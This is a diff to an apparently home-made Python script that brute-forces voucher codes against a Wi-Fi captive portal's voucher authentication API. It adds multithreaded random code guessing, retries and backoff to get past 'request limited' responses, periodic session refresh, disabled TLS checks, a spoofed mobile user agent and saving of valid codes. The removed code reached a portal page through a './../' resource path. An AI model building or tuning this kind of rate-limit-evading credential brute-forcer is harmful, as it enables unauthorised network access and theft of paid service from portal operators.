@@ -35,22 +35,20 @@ def cryptojs_encrypt(plaintext):
     ct = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
     return base64.b64encode(b"Salted__" + salt + ct).decode()
 
-def try_maccauth_verify(sess, host, sid, code):
-    """Verify a code via the maccauth portal page"""
-    res_id = "mrlev58jlgslg49ervu"
-    url = f"{host}/download/static/maccauth/src/index.html"
-    url += f"?RES=./../expand/res/{res_id}&IS_EG=0&sessionId={sid}"
+def try_encrypted_auth(sess, host, sid, code):
+    """Try auth with encrypted accessCode (if PyCryptodome available)"""
+    if not HAVE_CRYPTO:
+        return None
     try:
-        r = sess.get(url, timeout=10)
-        # If page loads, try encrypting the code and posting
-        if r.status_code == 200 and "maccauth" in r.text:
-            encrypted = cryptojs_encrypt(code)
-            if encrypted:
-                auth_url = f"{host}/api/auth/voucher/?lang=en_US"
-                r2 = sess.post(auth_url, json={
-                    "accessCode": encrypted, "sessionId": sid, "apiVersion": 1
-                }, timeout=5)
-                return r2.json()
+        encrypted = cryptojs_encrypt(code)
+        if encrypted:
+            url = f"{host}/api/auth/voucher/?lang=en_US"
+            r = sess.post(url, json={
+                "accessCode": encrypted, "sessionId": sid, "apiVersion": 1
+            }, timeout=5)
+            j = r.json()
+            if j.get("success") == True and j.get("result", {}).get("authResult") == "1":
+                return j
         return None
     except:
         return None
@@ -452,40 +450,73 @@ def charset_bruteforce(charset, length, label):
     SID_DATA = {"sid": sid}
     found_list = []
     tried = 0
+    errors = 0
+    rate_limited = 0
+    success_count = 0
     start_time = time.time()
     STOP.clear()
+    REFRESH_LOCK = threading.Lock()
+    global_refresh_counter = 0
 
     def worker():
-        nonlocal tried
+        nonlocal tried, errors, rate_limited, success_count, global_refresh_counter
         sess2 = requests.Session()
         sess2.verify = False
         sess2.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
         api_url = f"{host}/api/auth/voucher/?lang=en_US"
-        local_count = 0
         while not STOP.is_set():
             code = ''.join(random.choices(charset, k=length))
-            with LOCK: sid_current = SID_DATA["sid"]
-            try:
-                r = sess2.post(api_url, json={
-                    "accessCode": code, "sessionId": sid_current, "apiVersion": 1
-                }, timeout=5)
-                j = r.json()
-                if j.get("success") == True and j.get("result", {}).get("authResult") == "1":
-                    print(f"\n  >>> VALID: {code}")
-                    save_code(code)
-                    with LOCK:
-                        found_list.append(code)
-                        if target and len(found_list) >= target:
-                            STOP.set()
+            retries = 0
+            while retries < 3:
+                with LOCK: sid_current = SID_DATA["sid"]
+                try:
+                    r = sess2.post(api_url, json={
+                        "accessCode": code, "sessionId": sid_current, "apiVersion": 1
+                    }, timeout=5)
+                    j = r.json()
+                    msg = j.get("message", "")
+                    if msg == "request limited":
+                        retries += 1
+                        if retries >= 3:
+                            with LOCK:
+                                rate_limited += 1
+                                tried += 1
                             break
-            except: pass
-            with LOCK: tried += 1
-            local_count += 1
-            if local_count >= 500:
+                        time.sleep(0.2 * retries)
+                        continue
+                    if j.get("success") == True and j.get("result", {}).get("authResult") == "1":
+                        print(f"\n  >>> VALID: {code}")
+                        save_code(code)
+                        with LOCK:
+                            found_list.append(code)
+                            if target and len(found_list) >= target:
+                                STOP.set()
+                                return
+                    else:
+                        with LOCK:
+                            if success_count == 0 and rate_limited == 0 and errors == 0:
+                                print(f"\n  [API sample] code={code} | message={msg}")
+                    with LOCK: success_count += 1
+                    with LOCK: tried += 1
+                    break
+                except Exception as e:
+                    with LOCK:
+                        errors += 1
+                        if errors == 1:
+                            print(f"\n  [!] First error: {e}")
+                        elif errors % 100 == 0:
+                            print(f"\n  [!] {errors} errors so far")
+                    break
+            # Global session refresh
+            with REFRESH_LOCK:
+                global_refresh_counter += 1
+                do_refresh = global_refresh_counter >= 500
+                if do_refresh:
+                    global_refresh_counter = 0
+            if do_refresh:
                 ns = refresh_session(host, params)
                 if ns:
                     with LOCK: SID_DATA["sid"] = ns
-                local_count = 0
         sess2.close()
 
     threads = []
@@ -498,9 +529,15 @@ def charset_bruteforce(charset, length, label):
     try:
         while any(t.is_alive() for t in threads):
             time.sleep(2)
-            with LOCK: t2 = tried
+            with LOCK:
+                t2 = tried
+                e = errors
+                rl = rate_limited
+                s = success_count
             rate = (t2 - last_tried) / 2
-            sys.stdout.write(f"\r  Tried: {t2:,} | {rate:.0f}/s | Found: {len(found_list)}")
+            err_pct = e / (t2 or 1) * 100
+            rl_pct = rl / (t2 or 1) * 100
+            sys.stdout.write(f"\r  Tried: {t2:,} | {rate:.0f}/s | Found: {len(found_list)} | OK: {s} | RL: {rl} ({rl_pct:.0f}%) | ERR: {e} ({err_pct:.0f}%)")
             sys.stdout.flush()
             last_tried = t2
     except KeyboardInterrupt:
